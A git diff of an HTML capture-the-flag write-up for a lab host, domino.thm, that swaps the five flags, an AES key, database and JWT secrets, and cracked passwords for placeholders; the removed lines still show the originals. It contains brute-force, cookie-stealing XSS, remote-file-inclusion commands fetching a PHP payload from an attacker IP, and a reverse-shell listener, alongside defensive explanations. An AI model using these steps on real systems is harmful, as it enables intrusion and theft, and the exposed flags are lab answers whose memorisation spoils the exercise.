@@ -102,11 +102,11 @@
       <div class="wr-summary-row"><span class="wr-summary-key">Chain</span><span class="wr-summary-val">User enum &rarr; Hydra &rarr; IDOR &rarr; Blind XSS &rarr; JWT forgery &rarr; RFI/RCE &rarr; password reuse &rarr; cron privesc</span></div>
       <div class="wr-summary-row"><span class="wr-summary-key">References</span><span class="wr-summary-val">CWE-203 &middot; CWE-639 &middot; CWE-79 &middot; CWE-347 &middot; CWE-98 &middot; CWE-522 &middot; CWE-732</span></div>
       <div class="wr-summary-row"><span class="wr-summary-key">Tools</span><span class="wr-summary-val">nmap &middot; gobuster &middot; hydra &middot; Python &middot; jwt_tool &middot; pspy &middot; netcat</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Flag 1 &mdash; IDOR</span><span class="wr-summary-val wr-flag">THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Flag 2 &mdash; Blind XSS</span><span class="wr-summary-val wr-flag">THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Flag 3 &mdash; RFI/RCE</span><span class="wr-summary-val wr-flag">THM{rf1_2_rc3_f00th0ld_fl4g3}</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Flag 4 &mdash; Cred reuse</span><span class="wr-summary-val wr-flag">THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}</span></div>
-      <div class="wr-summary-row"><span class="wr-summary-key">Flag 5 &mdash; Root</span><span class="wr-summary-val wr-flag">THM{pr1v3sc_cr0n_r00t_fl4g5}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Flag 1 &mdash; IDOR</span><span class="wr-summary-val wr-flag">THM{flag for question #1}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Flag 2 &mdash; Blind XSS</span><span class="wr-summary-val wr-flag">THM{flag for question #2}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Flag 3 &mdash; RFI/RCE</span><span class="wr-summary-val wr-flag">THM{flag for question #3}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Flag 4 &mdash; Cred reuse</span><span class="wr-summary-val wr-flag">THM{flag for question #4}</span></div>
+      <div class="wr-summary-row"><span class="wr-summary-key">Flag 5 &mdash; Root</span><span class="wr-summary-val wr-flag">THM{flag for question #5}</span></div>
     </div>
     <div class="wr-toc">
       <div class="wr-toc-title">Contents</div>
@@ -288,8 +288,8 @@ Decryption key reference: see static/app.js (deployment notes)</div>
         <p class="wr-p"><em>(We had to use <span class="wr-inline-code">--output -</span> here because plain <span class="wr-inline-code">curl</span> detected some non-text-looking bytes in the response and refused to dump it straight to the terminal, as a safety measure to avoid messing up terminal display. <span class="wr-inline-code">--output -</span> forces it to print anyway.)</em></p>
         <p class="wr-p">Inside, we found this in plain, unobfuscated JavaScript comments:</p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">// Encryption key for backup config decryption - AES-ECB-128
-// Key: N3xusK3y2024!!  (pad to 16 bytes with )
-_backupKey: 'N3xusK3y2024!!',</div>
+// Key: redacted  (pad to 16 bytes with )
+_backupKey: 'redacted',</div>
         <p class="wr-p"><strong>This is a real, extremely common vulnerability: Hardcoded Secrets in Client-Side Code.</strong></p>
         <p class="wr-p"><strong>What it is:</strong> Any code that runs in a user's browser (JavaScript, in this case) is fully downloadable and readable by that user &mdash; there is no way to "hide" a secret inside JS that a browser has to execute. Developers sometimes forget this and put API keys, encryption keys, or other secrets directly into frontend code, assuming users won't look.</p>
         <p class="wr-p"><strong>Why it matters:</strong> Anyone &mdash; not just this room's attacker &mdash; can view a website's JS files (they're just downloaded and interpreted by your browser) as easily as you'd open a text file.</p>
@@ -297,7 +297,7 @@ _backupKey: 'N3xusK3y2024!!',</div>
         <h3 class="wr-h3">Writing the decryption script</h3>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">from Crypto.Cipher import AES
 
-key = b'N3xusK3y2024!!' + b'\x00' * 2   # pad 14 bytes -&gt; 16 with null bytes
+key = b'redacted' + b'\x00' * 2   # pad 14 bytes -&gt; 16 with null bytes
 data = open('config.enc', 'rb').read()
 
 cipher = AES.new(key, AES.MODE_ECB)
@@ -306,7 +306,7 @@ print(plaintext)</div>
         <p class="wr-p"><strong>Line-by-line explanation:</strong></p>
         <ul style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">from Crypto.Cipher import AES</span> &mdash; imports the AES encryption/decryption functionality from the <span class="wr-inline-code">pycryptodome</span> Python library (installed via <span class="wr-inline-code">pip install pycryptodome</span>).</li>
-          <li style="margin-bottom:.35rem"><span class="wr-inline-code">key = b'N3xusK3y2024!!' + b'\x00' * 2</span> &mdash; the leaked key text is only 14 characters long, but <strong>AES-128 requires a key of exactly 16 bytes</strong> (128 bits ÷ 8 bits per byte = 16 bytes). The <span class="wr-inline-code">b'...'</span> prefix means "this is raw bytes, not a normal text string." <span class="wr-inline-code">b'\x00' * 2</span> creates two null bytes (<span class="wr-inline-code">\x00</span> is the escape sequence for a single zero-value byte) and appends them to reach the required 16-byte length. This padding scheme (fill remaining space with zero bytes) was our best guess based on the README's cut-off hint, and it turned out to be correct.</li>
+          <li style="margin-bottom:.35rem"><span class="wr-inline-code">key = b'redacted' + b'\x00' * 2</span> &mdash; the leaked key text is only 14 characters long, but <strong>AES-128 requires a key of exactly 16 bytes</strong> (128 bits ÷ 8 bits per byte = 16 bytes). The <span class="wr-inline-code">b'...'</span> prefix means "this is raw bytes, not a normal text string." <span class="wr-inline-code">b'\x00' * 2</span> creates two null bytes (<span class="wr-inline-code">\x00</span> is the escape sequence for a single zero-value byte) and appends them to reach the required 16-byte length. This padding scheme (fill remaining space with zero bytes) was our best guess based on the README's cut-off hint, and it turned out to be correct.</li>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">data = open('config.enc', 'rb').read()</span> &mdash; opens the downloaded encrypted file in <span class="wr-inline-code">'rb'</span> mode (read binary &mdash; important, because encrypted data isn't valid text and would get corrupted if read as text) and reads its entire contents into memory.</li>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">cipher = AES.new(key, AES.MODE_ECB)</span> &mdash; creates an AES cipher object configured to use our key and <strong>ECB (Electronic Codebook) mode</strong>. ECB is the simplest AES mode &mdash; it encrypts each 16-byte block of data completely independently, with no relationship between blocks.</li>
           <li style="margin-bottom:.35rem"><span class="wr-inline-code">plaintext = cipher.decrypt(data)</span> &mdash; actually performs the decryption.</li>
@@ -346,10 +346,10 @@ print(plaintext)</div>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">head -n 10000 /usr/share/wordlists/rockyou.txt &gt; pass_small.txt</div>
         <p class="wr-p"><span class="wr-inline-code">head -n 10000</span> takes just the first 10,000 lines of the file. Since <span class="wr-inline-code">rockyou.txt</span> is roughly sorted by how frequently each password appeared in the real-world data breach it came from, the top 10,000 entries cover the overwhelming majority of genuinely weak/common passwords &mdash; exactly the kind a deliberately vulnerable lab machine is built to use.</p>
         <h3 class="wr-h3">Result</h3>
-        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">[80][http-post-form] host: domino.thm   login: sarah.johnson   password: password
-[80][http-post-form] host: domino.thm   login: robert.wilson   password: password
-[80][http-post-form] host: domino.thm   login: emma.taylor     password: password</div>
-        <p class="wr-p">Three valid accounts, all sharing the trivially weak password <span class="wr-inline-code">password</span>. We proceeded with <span class="wr-inline-code">sarah.johnson</span>.</p>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">[80][http-post-form] host: domino.thm   login: sarah.johnson   password: redacted
+[80][http-post-form] host: domino.thm   login: robert.wilson   password: redacted
+[80][http-post-form] host: domino.thm   login: emma.taylor     password: redacted</div>
+        <p class="wr-p">Three valid accounts, all sharing the trivially weak password <span class="wr-inline-code">redacted</span>. We proceeded with <span class="wr-inline-code">sarah.johnson</span>.</p>
         <p class="wr-p"><strong>Why brute-forcing worked here as an attack technique:</strong> brute-force/dictionary attacks are only effective when (a) there's no account lockout after repeated failures, and (b) at least one user has a weak, common password. Real production systems defend against this with account lockouts, rate limiting, CAPTCHAs, and multi-factor authentication &mdash; none of which were present here, by design, since this is a learning environment.</p>
       </div>
       <div class="wr-phase" id="flag-1-idor-insecure-direct-object-reference">
@@ -364,9 +364,9 @@ print(plaintext)</div>
   "username": "laura.hayes",
   "email": "laura.hayes@nexus.corp",
   "role": "admin",
-  "notes": "THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}"
+  "notes": "THM{flag for question #1}"
 }</div>
-        <p class="wr-p"><strong>Flag 1 obtained: <span class="wr-inline-code">THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}</span></strong></p>
+        <p class="wr-p"><strong>Flag 1 obtained: <span class="wr-inline-code">THM{flag for question #1}</span></strong></p>
         <h3 class="wr-h3">The concept: Insecure Direct Object Reference (IDOR)</h3>
         <p class="wr-p"><strong>What it is:</strong> An application exposes a direct, predictable reference to an internal object (in this case, a simple sequential database ID number) in a URL, and fails to check whether the person making the request is actually <em>authorized</em> to see that specific object.</p>
         <p class="wr-p"><strong>Why it matters:</strong> The server correctly verified that <em>someone</em> was logged in (you needed a valid session to reach this page at all) &mdash; but it never checked whether the logged-in user <em>owned</em> the record they were requesting. It trusted the client-supplied <span class="wr-inline-code">id</span> parameter completely.</p>
@@ -430,17 +430,17 @@ python3 listener.py</div>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">--- GET /steal?c= ---
 Host: 10.128.111.101
 User-Agent: python-requests/2.31.0
-Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834</div>
+Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.redacted</div>
         <p class="wr-p"><strong>A crucial detail: the <span class="wr-inline-code">c=</span> query parameter was empty, but the real prize was elsewhere.</strong></p>
         <p class="wr-p">Look at the <span class="wr-inline-code">User-Agent</span> header: <span class="wr-inline-code">python-requests/2.31.0</span>. This tells us the "admin" reviewing the ticket wasn't a real human using a real browser &mdash; it was an <strong>automated Python script/bot</strong> fetching the ticket content. A Python <span class="wr-inline-code">requests</span>-based bot has no JavaScript engine at all &mdash; it can't execute our <span class="wr-inline-code">&lt;img onerror&gt;</span> payload, which is <em>why</em> <span class="wr-inline-code">document.cookie</span> never got appended to the URL (<span class="wr-inline-code">c=</span> stayed empty; there was no JavaScript execution to populate it).</p>
         <p class="wr-p"><strong>However</strong>, that bot still made an authenticated HTTP request to review the ticket &mdash; using its own real, valid, server-signed session cookie, which showed up automatically in the <span class="wr-inline-code">Cookie:</span> header of the request it sent to our server. This is technically closer to a <strong>Server-Side Request Forgery (SSRF)</strong>-flavored variant than classic browser-based XSS (the bot fetching an attacker-controlled URL while authenticated), but the practical outcome is identical: we captured a fully valid admin session.</p>
         <h3 class="wr-h3">Using the stolen cookie</h3>
-        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">document.cookie = "nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834; path=/"</div>
+        <div class="wr-code" tabindex="0" role="region" aria-label="Code block">document.cookie = "nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.redacted; path=/"</div>
         <p class="wr-p">Typed into the browser console (on any page of <span class="wr-inline-code">domino.thm</span>), this <strong>overwrites</strong> the browser's current cookie for this site with the stolen admin cookie value. <span class="wr-inline-code">path=/</span> means "this cookie applies to every page on this site," matching how cookies are normally scoped.</p>
         <p class="wr-p">Navigating to <span class="wr-inline-code">/admin/</span> afterward loaded successfully:</p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">Logged in as: laura.hayes
-Internal reference: THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</div>
-        <p class="wr-p"><strong>Flag 2 obtained: <span class="wr-inline-code">THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</span></strong></p>
+Internal reference: THM{flag for question #2}</div>
+        <p class="wr-p"><strong>Flag 2 obtained: <span class="wr-inline-code">THM{flag for question #2}</span></strong></p>
         <p class="wr-p"><strong>How defenders prevent this class of bug entirely:</strong></p>
         <ol style="margin:.2rem 0 1.1rem 1.1rem;padding-left:.6rem;font-size:.85rem;color:var(--text2);line-height:1.8">
           <li style="margin-bottom:.35rem"><strong>Input sanitization/output encoding</strong> &mdash; properly escape user-supplied content before displaying it (e.g., convert <span class="wr-inline-code">&lt;</span> to <span class="wr-inline-code">&amp;lt;</span>) so it displays as visible text instead of executing as HTML/JavaScript.</li>
@@ -511,8 +511,8 @@ curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/file
         <p class="wr-p"><strong>Getting the flag directly through this RCE:</strong></p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">echo '&lt;?php system("cat /opt/flag3.txt"); ?&gt;' &gt; shell_test.php
 curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/files.php?name=http://10.128.111.101:8000/shell_test.php"</div>
-        <p class="wr-p">Result: <span class="wr-inline-code">{"output":"THM{rf1_2_rc3_f00th0ld_fl4g3}\n"}</span></p>
-        <p class="wr-p"><strong>Flag 3 obtained: <span class="wr-inline-code">THM{rf1_2_rc3_f00th0ld_fl4g3}</span></strong></p>
+        <p class="wr-p">Result: <span class="wr-inline-code">{"output":"THM{flag for question #3}\n"}</span></p>
+        <p class="wr-p"><strong>Flag 3 obtained: <span class="wr-inline-code">THM{flag for question #3}</span></strong></p>
         <h3 class="wr-h3">Getting a proper interactive shell</h3>
         <p class="wr-p">One-off commands via <span class="wr-inline-code">system()</span> calls work but are extremely slow for real exploration. We upgraded to a full interactive reverse shell:</p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">nc -lvnp 4444</div>
@@ -547,19 +547,19 @@ curl -H "Authorization: Bearer &lt;forged_token&gt;" "http://domino.thm/api/file
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">define('DB_HOST', 'localhost');
 define('DB_NAME', 'nexusdb');
 define('DB_USER', 'app_user');
-define('DB_PASS', 'D3v0ps!2024');
-define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
-define('APP_SECRET', 'nexus_app_k3y_2024');</div>
-        <p class="wr-p">The password <span class="wr-inline-code">D3v0ps!2024</span> strongly resembled the <span class="wr-inline-code">devops</span> username pattern we'd already learned about (from the earlier <span class="wr-inline-code">config.enc</span> decryption, which revealed a <span class="wr-inline-code">system_user: devops</span> field).</p>
+define('DB_PASS', 'redacted');
+define('JWT_SECRET', 'redacted');
+define('APP_SECRET', 'redacted');</div>
+        <p class="wr-p">The password <span class="wr-inline-code">redacted</span> strongly resembled the <span class="wr-inline-code">devops</span> username pattern we'd already learned about (from the earlier <span class="wr-inline-code">config.enc</span> decryption, which revealed a <span class="wr-inline-code">system_user: devops</span> field).</p>
         <p class="wr-p"><strong>We tested whether this database password was also reused as the actual Linux operating system login password for the <span class="wr-inline-code">devops</span> user:</strong></p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">su devops</div>
         <p class="wr-p">(<span class="wr-inline-code">su</span> = "switch user" &mdash; prompts for that user's password and, if correct, starts a new shell session running as them.)</p>
-        <p class="wr-p">Entering <span class="wr-inline-code">D3v0ps!2024</span> when prompted succeeded &mdash; the shell prompt changed from <span class="wr-inline-code">www-data@...</span> to <span class="wr-inline-code">devops@...</span>, confirming the switch.</p>
+        <p class="wr-p">Entering <span class="wr-inline-code">redacted</span> when prompted succeeded &mdash; the shell prompt changed from <span class="wr-inline-code">www-data@...</span> to <span class="wr-inline-code">devops@...</span>, confirming the switch.</p>
         <p class="wr-p"><strong>Flag obtained from <span class="wr-inline-code">devops</span>'s home directory:</strong></p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cd ~
 cat user.txt</div>
-        <p class="wr-p">Result: <span class="wr-inline-code">THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}</span></p>
-        <p class="wr-p"><strong>Flag 4 obtained: <span class="wr-inline-code">THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}</span></strong></p>
+        <p class="wr-p">Result: <span class="wr-inline-code">THM{flag for question #4}</span></p>
+        <p class="wr-p"><strong>Flag 4 obtained: <span class="wr-inline-code">THM{flag for question #4}</span></strong></p>
         <h3 class="wr-h3">The concept: Credential/Password Reuse</h3>
         <p class="wr-p"><strong>What it is:</strong> Using the exact same password across multiple, separate accounts or systems &mdash; in this case, a database service account's password happened to also be a real human user's actual login password.</p>
         <p class="wr-p"><strong>Why it matters:</strong> Any single leaked credential (from a config file, a data breach, a log file, anywhere) becomes a potential key to <em>every other</em> account that shares it. This is one of the single most common real-world causes of full breaches &mdash; attackers routinely take credentials leaked from one system entirely unrelated to the actual target, and simply try them everywhere else (a technique called <strong>credential stuffing</strong>).</p>
@@ -610,8 +610,8 @@ ls -la /etc/cron.d/ /etc/cron.daily/</div>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">root@tryhackme-2404:~#</div>
         <p class="wr-p"><strong>Full root access achieved.</strong></p>
         <div class="wr-code" tabindex="0" role="region" aria-label="Code block">cat /root/root.txt</div>
-        <p class="wr-p">Result: <span class="wr-inline-code">THM{pr1v3sc_cr0n_r00t_fl4g5}</span></p>
-        <p class="wr-p"><strong>Flag 5 obtained: <span class="wr-inline-code">THM{pr1v3sc_cr0n_r00t_fl4g5}</span></strong></p>
+        <p class="wr-p">Result: <span class="wr-inline-code">THM{flag for question #5}</span></p>
+        <p class="wr-p"><strong>Flag 5 obtained: <span class="wr-inline-code">THM{flag for question #5}</span></strong></p>
         <h3 class="wr-h3">The concept: Cron-Based Privilege Escalation via Weak File Permissions</h3>
         <p class="wr-p"><strong>What it is:</strong> A scheduled task (cron job) runs as a highly privileged user (root), but the script file it executes has permissions loose enough that a lower-privileged user can modify its contents.</p>
         <p class="wr-p"><strong>Why it's dangerous:</strong> cron jobs are, by definition, designed to run unattended and repeatedly, without any human reviewing what they do each time. This makes them an extremely reliable, low-effort privilege escalation vector once write access is found &mdash; you don't need to defeat any authentication or exploit any complex logic bug, you just wait for the next scheduled run.</p>
